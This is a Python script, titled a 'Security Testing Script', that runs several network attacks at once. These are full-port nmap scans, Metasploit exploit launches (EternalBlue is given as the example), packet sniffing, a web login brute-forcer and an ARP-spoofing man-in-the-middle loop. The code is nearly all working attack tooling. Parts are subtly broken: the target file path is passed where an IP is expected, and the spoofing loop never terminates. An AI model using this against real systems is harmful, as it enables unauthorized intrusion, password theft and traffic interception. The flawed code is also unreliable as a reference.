import os
import time
import requests
import threading
import scapy.all as scapy

# Function to scan network from a file
def network_scan(target_file, log_file):
    print(f"[+] Scanning network targets from {target_file}")
    with open(target_file, 'r') as f:
        targets = f.readlines()

    with open(log_file, 'a') as log:
        for target_ip in targets:
            target_ip = target_ip.strip()
            print(f"[*] Scanning {target_ip}")
            os.system(f"nmap -sS -p- -T4 {target_ip} >> {log_file}")
            log.write(f"[+] Scan complete for {target_ip}\n")
    print("[+] Network scan completed. Logs saved to", log_file)

# Function to simulate exploit using Metasploit
def exploit_simulation(target_ip, metasploit_payload, log_file):
    print(f"[+] Running exploit on {target_ip}")
    exploit_cmd = f"msfconsole -q -x 'use {metasploit_payload}; set RHOST {target_ip}; exploit'"
    os.system(exploit_cmd)
    with open(log_file, 'a') as log:
        log.write(f"[+] Exploit executed on {target_ip}\n")
    print("[+] Exploit attempt completed.")

# Function to sniff packets and save to a file
def packet_sniffing(interface, output_file):
    print(f"[+] Starting packet sniffing on {interface}")
    packets = scapy.sniff(iface=interface, count=100, prn=lambda x: x.summary())  # Capture 100 packets
    scapy.wrpcap(output_file, packets)  # Save packets to a file
    print(f"[+] Packet sniffing completed, packets saved to {output_file}")

# Function for web brute force attack
def web_brute_force(target_url, username, password_file, log_file):
    print(f"[+] Initiating brute-force attack on {target_url}")
    with open(password_file, 'r') as f:
        passwords = f.readlines()

    with open(log_file, 'a') as log:
        for pwd in passwords:
            pwd = pwd.strip()
            data = {"username": username, "password": pwd}
            response = requests.post(target_url, data=data)
            if "Invalid password" not in response.text:
                print(f"[+] Login successful with {username}:{pwd}")
                log.write(f"[+] Successful login on {target_url} with {username}:{pwd}\n")
                break
    print("[+] Brute-force attack completed.")

# Function for MITM attack via ARP spoofing
def mitm_attack(target_ip, gateway_ip):
    print(f"[+] Initiating MITM attack on {target_ip}")
    spoof_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=gateway_ip)
    while True:
        scapy.send(spoof_packet, verbose=False)
        time.sleep(2)
    print("[+] ARP Spoofing attack completed.")

# Main Execution Flow
if __name__ == "__main__":
    print("===== Security Testing Script =====")
    
    # User Inputs
    target_file = input("Enter the file path containing target IPs: ")
    gateway_ip = input("Enter the gateway IP (for MITM attack): ")
    network_interface = input("Enter the network interface (e.g., eth0, wlan0): ")
    web_target = input("Enter the target web application URL (for brute-force testing): ")
    username = input("Enter the username for brute-force attack: ")
    password_file = input("Enter the file path containing password list: ")
    packet_output_file = input("Enter the file path to save captured packets: ")
    metasploit_payload = input("Enter the Metasploit payload to use (e.g., exploit/windows/smb/ms17_010_eternalblue): ")
    log_file = input("Enter the log file path to save results: ")

    # Running Attacks in Parallel
    threading.Thread(target=network_scan, args=(target_file, log_file)).start()
    threading.Thread(target=exploit_simulation, args=(target_file, metasploit_payload, log_file)).start()
    threading.Thread(target=packet_sniffing, args=(network_interface, packet_output_file)).start()
    threading.Thread(target=web_brute_force, args=(web_target, username, password_file, log_file)).start()
    threading.Thread(target=mitm_attack, args=(target_file, gateway_ip)).start()
